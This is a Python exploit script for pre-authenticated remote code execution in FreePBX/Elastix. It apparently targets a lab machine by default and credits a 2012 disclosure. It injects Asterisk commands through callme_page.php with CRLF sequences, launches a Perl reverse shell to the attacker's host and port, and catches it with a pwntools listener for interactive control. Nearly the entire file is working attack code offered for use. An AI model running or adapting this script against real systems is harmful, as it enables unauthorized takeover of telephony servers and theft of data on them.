#!/usr/bin/python3
############################################################
# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
# Tested on: multiple
# Author: k4miyo
# Original exploit: https://www.exploit-db.com/exploits/18650
############################################################
# Discovered by Martin Tschirsich
# http://seclists.org/fulldisclosure/2012/Mar/234
# http://www.exploit-db.com/exploits/18649
############################################################
# If you have problems with certificate, try:
# Edit openssl.conf file
#   sudo nano /etc/ssl/openssl.cnf
# Add this line at the top:
#   openssl_conf = openssl_init 
# Add these lines at the end:
#   [openssl_init] 
#   ssl_conf = ssl_sect
#   [ssl_sect] 
#   system_default = system_default_sect
#   [system_default_sect] 
#   CipherString = DEFAULT@SECLEVEL=1
############################################################

import requests, sys, signal, argparse
import os, time, threading, string

from pwn import *

# Ctrl + C
def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Ignore warnings
if not sys.warnoptions:
    import warnings
    warnings.simplefilter("ignore")


# Global variables
rhost="10.10.10.7"
lhost="10.10.14.8"
lport=443
extension="233"

# Reverse shell payload
def makeRequest():
    try:
        p1 = log.progress("Payload")
        p1.status("Generating payload...")
        time.sleep(2)
        url = "https://{}/recordings/misc/callme_page.php?action=c&callmenum={}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{}%3a{}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A".format(rhost, extension, lhost, lport)
        p1.success("Payload generated")
        time.sleep(2)
        p2 = log.progress("Request")
        p2.status("Sending payload")
        r = requests.get(url, verify=False)
        p2.sucess("Payload sent correctly")
    except Exception as e:
        p2.failure("Payload sent correctly")
        sys.exit(1)

if __name__ == '__main__':
    argparser = argparse.ArgumentParser(description='FreePBX / Elastix pre-authenticated remote code execution exploit')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (default: 10.10.10.7)',
            default='10.10.10.7')
    argparser.add_argument('--lhost', type=str,
            help='Local host ip (Attacker)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (default: 443)',
            default='443')
    argparser.add_argument('--ext', type=str,
              help='Extension (default: 233)',
              default='233')
    args = argparser.parse_args()

    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    extension = args.ext

    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
    p3 = log.progress("Shell")
    p3.status("Listening...")
    time.sleep(2)
    shell = listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
        p3.failure("No connection")
        time.sleep(2)
        sys.exit(1)
    else:
        p3.success("Established connection!")
        time.sleep(2)
    
    shell.interactive()
